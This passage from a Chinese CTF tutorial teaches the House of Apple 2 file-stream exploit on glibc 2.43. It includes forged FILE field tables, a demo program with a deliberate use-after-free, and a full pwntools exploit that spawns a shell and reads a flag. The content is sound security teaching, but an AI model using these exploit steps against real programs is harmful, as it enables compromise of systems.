call *0x68(%rax)            ; 调 _wide_vtable 的 __doallocate 槽位，rdi = fp
```

从这段还能读出 5.2 字段表的全部来历：哪些字段必须是 0、哪个字节决定走不走调用，==每条约束都对应一条具体的指令==。

### 5.2 需要控制的字段全集

伪造一套结构要摆三样东西：伪 FILE、伪 `_IO_wide_data`、伪 `_wide_vtable`。字段清单与每条的依据：

**伪 FILE**（设地址为 F）：

| 字段 | 偏移 | 摆什么 | 依据 |
| ---- | ---- | ---- | ---- |
| `_flags` | 0x00 | 字节 `20 20 20 20 2f 62 69 6e`（即 `"    /bin"`） | `_IO_UNBUFFERED`(0x2) 与 `_IO_NO_WRITES`(0x8) 两个标志为 0，0x800 位避开 `_IO_CURRENTLY_PUTTING`；整格兼作命令字符串开头 |
| `_IO_read_ptr` | 0x08 | 字节 `2f 73 68 00 ...`（即 `"/sh\0"`） | 接上字符串并补 NUL——拼出完整的 `"    /bin/sh"` |
| `_IO_write_base` | 0x20 | 0 | 刷新条件：`write_base < write_ptr` 才调 `_IO_OVERFLOW`（4.1） |
| `_IO_write_ptr` | 0x28 | 1 | 同上，比 `write_base` 大即可 |
| `_chain` | 0x68 | 0 | 链到此为止，不再遍历真实流 |
| `_lock` | 0x88 | 一段清零可写内存的地址（F+0x300） | 4.1 伪代码里的加锁动作（第 2.2 节的 warning） |
| `_wide_data` | 0xa0 | F+0x100 | 指向伪宽结构 |
| `_mode` | 0xc0 | 0 | 走 `_mode <= 0` 的刷新分支 |
| vtable | 0xd8 | `&_IO_wfile_jumps` | 合法跳表，过 3.2 的区间校验 |

**伪 `_IO_wide_data`**（F+0x100）：

| 字段 | 相对偏移 | 摆什么 | 依据 |
| ---- | ---- | ---- | ---- |
| `_IO_write_base` | +0x18 | 0 | `_IO_wfile_overflow` 里 `test %rsi,%rsi ; je` 的检查对象，为 0 才进入分配分支 |
| `_IO_buf_base` | +0x30 | 0 | `_IO_wdoallocbuf` 开头的 `cmpq $0x0,0x30(%rax)`，非 0 直接返回 |
| `_wide_vtable` | +0xe0 | F+0x200 | 最后一跳的跳表指针，==无区间校验== |

**伪 `_wide_vtable`**（F+0x200）：

| 槽位 | 相对偏移 | 摆什么 | 依据 |
| ---- | ---- | ---- | ---- |
| 其余槽位 | 0x00–0x67 | 0 | 本调用链不经过 |
| `__doallocate` | +0x68 | `&system` | `call *0x68(%rax)`，`rdi = fp = "    /bin/sh"` |

> [!info]- `_flags` 里"标志位"和"字符串"是怎么共存的
> `_flags` 的 8 个字节 `20 20 20 20 2f 62 69 6e` 按小端解释是整数 0x6e69622f20202020：最低字节 0x20 —— 0x2（UNBUFFERED）与 0x8（NO_WRITES）都为 0；第二字节 0x20 里 0x800（CURRENTLY_PUTTING）为 0，0x8000（USER_LOCK）也为 0；高位的 `2f 62 69 6e`（"/bin"）落在不会被当标志检查的高 32 位里。==一份数据两种解释==：标准库读标志位时它是整数，`system` 执行时它是命令的前 8 个字符。
>
> 顺带一个可省字段的技巧：把 `_flags` 的 0x8000 位置 1（`_IO_USER_LOCK`），刷新遍历会跳过加锁解锁，`_lock` 就不必伪造——代价是字符串的前两个字节被占用，命令要另想拼法。本章按最通用的摆法（保留 `_lock`）走。

### 5.3 演示程序：一个带 UAF 的菜单堆程序

漏洞形态与 [[P13-基础堆漏洞|P13]]、[[P14-tcache与fastbin利用|P14]] 的演示一致：`free` 之后不清指针，`edit` 对已释放的块照写不误。为让"伪造结构"的讲解保持在堆上，程序把每次分配的地址打印出来（==代替堆地址泄露==；真实题目不打印时，用 [[P14-tcache与fastbin利用|P14]] 的 safe-linking 空链泄露法同样能拿到）。程序共 5 个选项，选 5 从 main 返回——4.2 的触发路径二。

```c
/* p16_note.c —— UAF 菜单堆程序：free 后不清指针，edit 仍可写（x86-64 Linux，glibc 2.43） */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define N 16
static void *ptr[N];
static size_t len[N];

static long getlong(void) {
    char buf[0x20] = {0};
    if (read(0, buf, sizeof(buf) - 1) <= 0)
        exit(0);
    return atol(buf);
}

static void edit_loop(void *p, size_t n) {
    size_t done = 0;
    while (done < n) {
        ssize_t r = read(0, (char *)p + done, n - done);
        if (r <= 0)
            return;
        done += (size_t)r;
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    for (;;) {
        int op, idx = 0;
        puts("1.new 2.edit 3.show 4.free 5.exit");
        printf("> ");
        op = (int)getlong();
        if (op >= 1 && op <= 4) {
            printf("idx: ");
            idx = (int)getlong();
            if (idx < 0 || idx >= N)
                return 0;
        }
        if (op == 1) {
            long size;
            printf("size: ");
            size = getlong();
            if (size <= 0 || size > 0x500)
                return 0;
            ptr[idx] = malloc((size_t)size);
            len[idx] = (size_t)size;
            printf("ptr[%d] = %p\n", idx, ptr[idx]);
        } else if (op == 2) {
            long n;
            if (!ptr[idx])
                return 0;
            printf("bytes: ");
            n = getlong();
            if (n <= 0 || (size_t)n > len[idx])
                return 0;
            printf("data: ");
            edit_loop(ptr[idx], (size_t)n);
        } else if (op == 3) {
            if (!ptr[idx])
                return 0;
            write(1, ptr[idx], 8);
            write(1, "\n", 1);
        } else if (op == 4) {
            if (!ptr[idx])
                return 0;
            free(ptr[idx]);          /* 漏洞点：ptr[idx] 不清零（UAF） */
        } else {
            return 0;                 /* 5：main 返回 */
        }
    }
}
```

```bash
gcc -O0 -fno-pie -no-pie -g p16_note.c -o p16_note
```

### 5.4 完整 exploit：从 UAF 到 getshell

利用分五步。前两步是 [[P14-tcache与fastbin利用|P14]] 的标准动作，后三步才是本章的新内容。

**第一步：libc 泄露。**申请一个 0x4f8 的块（换算成 0x500 的 chunk，==超出 tcache 的 0x410 上限==，[[P12-glibc堆管理机制#4. malloc 的主干流程|P12 第 4 节]]），后面垫一个 0x68 的小块隔开 top，然后 free——它直接进 unsorted bin，fd/bk 指向 main_arena 里的链头（[[P12-glibc堆管理机制#8. 一条 malloc/free 序列的全程跟踪|P12 第 8 节]]阶段 H 的现场）。UAF 让 `show` 还能读到这 8 个字节，减去固定偏移就是 libc 基址；偏移本身用 `setarch -R` 关掉 ASLR 量一次（量法与 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]同源）：

```python
#!/usr/bin/env python3
# measure.py —— 关 ASLR 量出本版 libc 的 unsorted 链头偏移
from pwn import *
context.log_level = 'error'
io = process(['setarch', '-R', './p16_note'])

def new(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.recvuntil(('ptr[%d] = ' % idx).encode())
    return int(io.recvline().strip(), 16)

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())
    return u64(io.recvn(8))

def free_(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

new(0, 0x4f8)
new(1, 0x68)          # 垫块：隔开 top
free_(0)              # 0x500 的块进 unsorted，fd 指向链头
leak = show(0)
base = 0x7ffff7c00000   # setarch -R 下 libc 固定装载基址
print('unsorted 链头地址 =', hex(leak))
print('libc 偏移        =', hex(leak - base))
io.sendlineafter(b'> ', b'5')
io.close()
```

输出：

```
unsorted 链头地址 = 0x7ffff7e12ac8
libc 偏移        = 0x212ac8
```

**第二步：tcache poisoning，把 malloc 指到 `_IO_list_all`。**再要两个 0x68 的块、free 进 tcache（0x70 档），UAF 改写链头块的 next 指针，按 safe-linking 的加密公式指向 `_IO_list_all`：

$$\text{存储值} = \left(\text{存储位置} \gg 12\right) \oplus \text{目标地址} \tag{16.1}$$

之后连续两次 `malloc(0x68)`：第一次弹出原链头块，==第二次分配器交出的就是 `_IO_list_all` 本身==（tcache 的取出路径只做对齐检查，2.1 已确认它 16 字节对齐）。从此 `edit` 这个下标，写的就是 libc 里那个指针变量——任意写落地。加密公式与对齐检查的来历 [[P14-tcache与fastbin利用|P14]] 完整讲过。

**第三步：在堆上摆三件套。**要一个 0x4f8 的块（地址已知），把 5.2 的三张表按偏移写进去。注意 `system`、`_IO_wfile_jumps`、`_IO_list_all` 三个 libc 地址都要"基址 + 偏移"现算（偏移查法见 [[P03-ELF链接与延迟绑定#6.4 手工匹配完整流程|P3 6.4]]）。

**第四步：改链头。**对第二步拿到的写入能力写 8 个字节：`_IO_list_all = 伪 FILE 地址`。这一次 edit 之后，程序自己的 `printf` 菜单照常工作——==真实流一个字节都没动==，被换掉的只是遍历的起点。

**第五步：触发。**菜单选 5，main 返回，沿 4.2 的调用链走到 `_IO_flush_all`，遍历从伪 FILE 开始：`_mode = 0` 且 `write_ptr(1) > write_base(0)`，进入 `__overflow`；vtable 校验区间检查通过；`_IO_wfile_overflow` → `_IO_wdoallocbuf` → `call [伪跳表+0x68]` → `system("    /bin/sh")`。

完整脚本：

```python
#!/usr/bin/env python3
# exp_hoa2.py —— House of Apple 2（glibc 2.43）
# UAF -> libc 泄露 -> tcache poisoning 拿到 &_IO_list_all 的写入 -> 伪造 FILE -> exit 触发 getshell
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# ---- 本版 libc（2.43）的常量偏移：nm -D libc.so.6 可查 ----
UNSORTED_OFF = 0x212ac8     # unsorted 链头（main_arena 内）相对基址的偏移
IO_LIST_ALL  = 0x213480     # _IO_list_all
WFILE_JUMPS  = 0x211228     # _IO_wfile_jumps

io = process('./p16_note')

def new(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.recvuntil(('ptr[%d] = ' % idx).encode())
    return int(io.recvline().strip(), 16)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'bytes: ', str(len(data)).encode())
    io.recvuntil(b'data: ')
    io.send(data)

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())
    return u64(io.recvn(8))

def free_(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---- 第一步：libc 泄露。0x500 的块不在 tcache 范围，free 直接进 unsorted，
#      fd/bk 指向 main_arena 里的链头；UAF 让 show 还能读到它 ----
new(0, 0x4f8)
new(1, 0x68)                  # 垫块：隔开 top，防止 free 时并入 top
free_(0)
base = show(0) - UNSORTED_OFF
assert base & 0xfff == 0, '基址没有页对齐，泄露或偏移有错'
success('libc base = ' + hex(base))

# ---- 第二步：堆泄露由程序打印承担；两个 0x68 的块 free 进 tcache，
#      借 UAF 改写链头块的 next（safe-linking 加密），指向 _IO_list_all ----
c2 = new(2, 0x68)
c3 = new(3, 0x68)
free_(2)
free_(3)
target = base + IO_LIST_ALL
edit(3, p64((c3 >> 12) ^ target))     # 加密公式见 P14：存储值 = (存储位置>>12) ^ 目标

p4 = new(4, 0x68)                     # 第一次 malloc：弹出 c3
p5 = new(5, 0x68)                     # 第二次 malloc：分配器交出 &_IO_list_all
success('new(4) = ' + hex(p4) + '（堆上）')
success('new(5) = ' + hex(p5) + '（= _IO_list_all，任意写到手）')

# ---- 第三步：在堆上一块 0x4f8 的 chunk 里摆好三件套 ----
F = new(6, 0x4f8)
success('fake FILE @ ' + hex(F))

buf = bytearray(0x4f8)
def put(off, data):
    buf[off:off + len(data)] = data

# 伪 FILE（偏移对照第 2 节字段表）
put(0x00, b'    /bin')                # _flags：低三位避开检查，同时兼作 system 的参数
put(0x08, b'/sh\x00')                 # _IO_read_ptr：接上 "/sh" 并补 NUL -> "    /bin/sh"
put(0x20, p64(0))                     # _IO_write_base = 0
put(0x28, p64(1))                     # _IO_write_ptr = 1 > write_base：flush 条件
put(0x68, p64(0))                     # _chain = NULL：链到此为止
put(0x88, p64(F + 0x300))             # _lock：指向本块内一段清零内存（可写即可）
put(0xa0, p64(F + 0x100))             # _wide_data
put(0xc0, p32(0))                     # _mode = 0
put(0xd8, p64(base + WFILE_JUMPS))    # vtable：合法跳表 _IO_wfile_jumps，过 vtable 校验
# 伪 _IO_wide_data
put(0x100 + 0x18, p64(0))             # _IO_write_base = NULL：触发 _IO_wdoallocbuf
put(0x100 + 0x30, p64(0))             # _IO_buf_base = NULL：不在 _IO_wdoallocbuf 提前返回
put(0x100 + 0xe0, p64(F + 0x200))     # _wide_vtable
# 伪跳表：__doallocate 槽位（+0x68）放 system
put(0x268, p64(base + libc.symbols['system']))

edit(6, bytes(buf))

# ---- 第四步：把 _IO_list_all 改成指向伪 FILE ----
edit(5, p64(F))

# ---- 第五步：main 返回 -> exit -> _IO_cleanup -> _IO_flush_all -> system("    /bin/sh") ----
io.sendlineafter(b'> ', b'5')
time.sleep(0.5)
io.sendline(b'echo p16_shell_ok; cat flag.txt')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

运行：

```bash
python3 exp_hoa2.py
```

输出：

```
[x] Starting local process './p16_note'
[+] Starting local process './p16_note': pid 2582
[+] libc base = 0x7b8b37200000
[+] new(4) = 0x7686080（堆上）
[+] new(5) = 0x7b8b37413480（= _IO_list_all，任意写到手）
[+] fake FILE @ 0x7686580
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 13B
[x] Receiving all data: 40B
[+] Receiving all data: Done (40B)
[*] Process './p16_note' stopped with exit code 0 (pid 2582)
p16_shell_ok
flag{p16_house_of_apple_2}
```

三处值得细看的输出：`new(5)` 打印的地址是 `0x7b8b37413480`——与 libc 基址 `0x7b8b37200000` 相距 0x213480，==正是 `_IO_list_all` 的偏移==，分配器被 poison 骗进 libc 的现场；`p16_shell_ok` 与 flag 都由伪造结构引出的 `system` 执行；进程退出码是 0——`system` 返回后刷新流程把剩余字段清干净地走完，==不需要程序崩溃来收尾==。

### 5.5 在 2.43 上的适用结论与变体

5.2 的约束清单在 2.43 上==逐条成立==：`_IO_wfile_overflow` 与 `_IO_wdoallocbuf` 的字段检查原样保留，`_wide_vtable` 不在区间校验的覆盖范围内，`_IO_list_all` / `_chain` 依旧是无签名的普通指针。原版 House of Apple 2 不需要任何变体即可使用。打远程时的差别只在偏移表（题目附件 libc 用 [[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地|P3 5.3]] 的 patchelf 装到本地，2.4 量偏移的方法不变）。

> [!info]- 同族的变体与这条路之外的选择
> - **House of Apple 1 / 3**：同一系列的另两篇，思路同源（不伪造 vtable、借合法跳表的槽位），差别在借用的调用链与触发点不同，字段约束各有增减。做"字段恰好凑不齐 5.2 清单"的题时换链，[[P15-House系列攻击技术|P15]] 有系列对照。
> - **`_IO_obstack_jumps`**：老资料里的另一张可借跳表（2.36 引入）。本机 2.43 的导出符号表里已经没有它（`nm -D libc.so.6 | grep obstack` 只剩 `obstack_printf` 一族函数），按老题解打这版环境会直接卡在符号解析。
> - **stdin 方向**：把伪造/篡改对象换成 stdin（`_IO_2_1_stdin_`），触发点从"退出刷新"变成"下一次 `scanf`/`gets` 读输入"——程序没有退出机会、又不方便碰 `_IO_list_all` 时的替代路。
> - **完全绕开 FILE 的路线**：ld.so 侧的结构（House of Banana / House of Cat 一族）与 exit 处理链的指针加密逆向，都在 [[P15-House系列攻击技术|P15]] 的讨论范围。

## 6. setcontext+0x35：一次调用换一整套寄存器

FSOP 的 `__doallocate` 槽位调用函数时只带一个参数（`rdi = fp`）。要执行的不是 `system` 而是一条 ROP 链（开了沙箱、`execve` 被禁、只能 ORW 的题——[[P08-ROP进阶与SROP|P8]]讲过 SROP 处理类似困境），就需要"把 rsp 搬到链上"的转移手段。glibc 的 `setcontext` 恰好是一台现成的"寄存器整体恢复机"：它本是 `getcontext`/`swapcontext` 家族的实现，==从 rdx 指向的一块 ucontext 结构里把全部寄存器逐个装回来==。2.43 上的装载段（`rdx` 为 ucontext 指针）：

```asm
; x86-64 Linux / System V AMD64 ABI，摘自 glibc 2.43 setcontext
mov  0xa0(%rdx),%rsp        ; rsp  <- [rdx+0xa0]
mov  0x80(%rdx),%rbx        ; rbx  <- [rdx+0x80]
mov  0x78(%rdx),%rbp
mov  0x48(%rdx),%r12
mov  0x50(%rdx),%r13
mov  0x58(%rdx),%r14
mov  0x60(%rdx),%r15
    ...
mov  0xa8(%rdx),%rcx        ; rcx <- [rdx+0xa8]：新的 rip
push %rcx
mov  0x70(%rdx),%rsi        ; 顺带把 rdi/rsi/rdx/r8/r9 也按 ucontext 装好
mov  0x68(%rdx),%rdi
mov  0x98(%rdx),%rcx
mov  0x28(%rdx),%r8
mov  0x30(%rdx),%r9
mov  0x88(%rdx),%rdx
xor  %eax,%eax
ret                          ; 弹出 [rdx+0xa8]，控制流落地
```

进入点选在装载 rsp 的那条指令（本版是 `setcontext+0x3d`，跳过开头的信号屏蔽与浮点环境装载——它们有各自的字段前提），==前提只剩一个：rdx 指向一块提前摆好的内存==，`[rdx+0xa0]` 放新栈顶，`[rdx+0xa8]` 放落地点。它流行起来的版本背景：2.29 起 ucontext 指针从 rdi 换成 rdx，老资料里"控制 rdi"的用法对不上新版本。

==概念定位==：它是"任意调用一次"到"完整控制寄存器与栈"的转换器——SROP 的替代品（拿不到 `rt_sigreturn` 的 gadget 时）、one_gadget 约束全不满足时的万能出口（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]第 4 节）、沙箱题里先转栈再跑 ORW 链的第一步。与本章的组合只需一句：5.1 的反汇编里 `_IO_wdoallocbuf` 调用前顺手执行了 `mov %rdi,%rdx`——==调用 `__doallocate` 槽位那一刻 rdx 恰好等于 fp==，所以把槽位换成 `setcontext+0x3d`，伪 ucontext 直接摆在伪 FILE 同一块 chunk 里即可，一字节的额外布点都不用。完整展开不在本章范围，掌握第 5 节的调用链后，按同样的方法即可自行拼装。

## 7. 从任意写到 getshell：现代利用链总览

把 [[P13-基础堆漏洞|P13]] 起四章的技术按"信息流"串起来，就是一道现代堆题的完整骨架：

```text
漏洞（UAF / off-by-one / 越界写 ……）        [[P13-基础堆漏洞|P13]]
        │
        ├─ 泄露 libc：unsorted / smallbin 的 fd、bk 指向 main_arena   [[P12-glibc堆管理机制|P12]]
        ├─ 泄露堆：程序打印、safe-linking 空链、show
        ▼
tcache poisoning / 其他 bin 攻击             [[P14-tcache与fastbin利用|P14]]
        │  malloc 出任意地址 -> edit = 任意写
        ▼
写谁？（执行落点）
        ├─ _IO_list_all 指向堆上伪造 FILE     ┐
        ├─ 已知 FILE 本体（stdout / stdin）    ├─ FSOP，本章
        ├─ ld.so 侧结构与 exit 处理链          ┘ [[P15-House系列攻击技术|P15]]
        ▼
触发：exit / main 返回 / abort
        │  _IO_flush_all 沿 _chain 遍历
        ▼
House of Apple 2：合法 vtable + 伪 _wide_data
        │  _IO_wfile_overflow -> _IO_wdoallocbuf -> 伪跳表+0x68
        ▼
system("    /bin/sh")   或   setcontext+0x3d 转栈跑 ROP/ORW
```

四条横向经验，做题时按需取用：

- **版本决定布点，不决定思路**。tcache 每档 16 个、fastbin 消失、`__libc_IO_vtables` 段并入 `.data.rel.ro`、hook 变兼容壳——变化全在"字段的值怎么凑、偏移怎么量"；"借数据结构解释器执行"的思路一层没变。版本差异对照以 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]为准。
- **落点选择看程序行为**。程序有干净退出路径 → 打 `_IO_list_all`（本章主线）；程序要继续用 stdio → 只动 `_IO_list_all` 这 8 字节，别整个覆盖 stdout；程序没有退出机会 → stdin 方向或 ld.so 侧。
- **每次"调用"都是约束清单**。本章 5.2 的三张表就是这么来的：对着反汇编把每个 `cmp`/`test` 翻译成一条"该字段必须是什么"。新版本、新调用链，照此重推即可，不背表。
- **泄露、任意写、落点三件事彼此独立**。任何能凑齐这三样的组合都成立：格式化字符串任意写（[[P09-格式化字符串漏洞|P9]]）替代 tcache poisoning、largebin 攻击（[[P15-House系列攻击技术|P15]]）替代它，同样通向第 5 节。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 编译利用引用 `__free_hook`，报 undefined reference | 2.34+ 它是单 `@` 的兼容定义，新代码链接不到（1.1）；换 stdio 路线 |
| `dlsym` 找 `__free_hook` 返回 NULL | 同上，运行期也解析不到兼容定义（1.1 的演示） |
| 改完 vtable 一调用就 `Fatal error: glibc detected an invalid stdio handle` 后 abort | vtable 指针落在合法区间外（3.2、3.3）；别伪造跳表，借区间内的 `_IO_wfile_jumps`（第 5 节） |
| `malloc(): unaligned tcache chunk detected` | poisoning 的目标地址没有 16 字节对齐；`_IO_list_all` 本身对齐，检查是否算错了偏移（5.4） |
| 触发后程序安静退出，什么都没发生 | 刷新条件没过：`_IO_write_ptr <= _IO_write_base`，或 `_mode` 摆错走了另一分支（4.1） |
| 还没到调用就段错误，GDB 停在 `lock cmpxchg` 一带 | `_lock` 没指向可写内存（2.2 的 warning）；或改用 `_flags` 的 0x8000 位跳过加锁（5.2 折叠框） |
| shell 起来了但命令不是预期的 | `system(fp)` 执行的是 fp 起始的字符串，`_flags` 与 `_IO_read_ptr` 两个槽位要拼成 `"/bin/sh\0"`，偏移摆错会截断（5.2） |
| 改了 stdout 本体后程序打印就崩 | 程序还要用 stdio 时，整个覆盖 stdout 会让它走进伪造字段；改打 `_IO_list_all` 这 8 字节（5.4） |
| one_gadget 候选约束全不满足 | 把 `__doallocate` 槽位换成 `setcontext+0x3d`，借 rdx=fp 转栈跑 ROP（第 6 节）； gadget 与约束见 [[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]、[[P08-ROP进阶与SROP\|P8]] |
| 题目开沙箱，shell 拿了也读不了 flag | `execve` 被禁，改 ORW：setcontext 转栈后跑 open/read/write 的 ROP 链（第 6 节） |
| 按老题解 free 7 个装满 tcache / 第 8 个进 fastbin | 版本行为不同，先读 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]的对照表 |
| 远程能跑通本地偏移却对不上 | 偏移表要用题目附件的 libc 重新量，本地用 patchelf 装附件（[[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地\|P3 5.3]]） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务：把这条链打到在线平台
> ① 复现变体：把 5.4 的 exploit 改成==不碰 `_IO_list_all`== 的版本——poison 直接指向 `_IO_2_1_stdout_`（它同样 16 字节对齐），把 5.2 的三件套整体写进 stdout 本体。程序每轮菜单都要 `printf`，先想清楚为什么这版需要重新安排"谁来当遍历起点"，再动笔。
> ② 平台练习：在 NSSCTF（nssctf.cn）或 BUUCTF（buuoj.cn）按"house of apple"、"FSOP"、"glibc 2.35"检索 2.34+ 的堆题，挑两道：一道用本章主线（任意写 → `_IO_list_all` → exit 触发），一道题目不打印地址、需要自己泄露堆基址（[[P14-tcache与fastbin利用|P14]] 的方法）。附件 libc 与本地不一致时，patchelf 换载（[[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地|P3 5.3]]），偏移全部按附件重新量。

延伸阅读按用途分三档：

- **glibc 源码**：`libio/genops.c`（`_IO_flush_all` 与链遍历）、`libio/wfileops.c`（`_IO_wfile_overflow`、`_IO_wdoallocbuf`——5.1 反汇编的出处）、`libio/vtables.c`（`_IO_vtable_check`）。本章所有字段约束都能在这些文件里找到对应的 `if`。
- **社区资料**：House of Apple 系列原文（roderick01，看雪论坛 2022，三篇对应 1/2/3 三种调用链）；shellphish 的 how2heap 仓库按攻击组织最小示例，跑之前先对 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的版本表；CTF Wiki 的 FSOP 条目适合当词汇表。
- **后续章节**：House 系列全景与 largebin 攻击 → [[P15-House系列攻击技术|P15]]；把堆布局当成解题工具、多技术组合 → [[P17-堆风水与通用利用思路|P17]]。
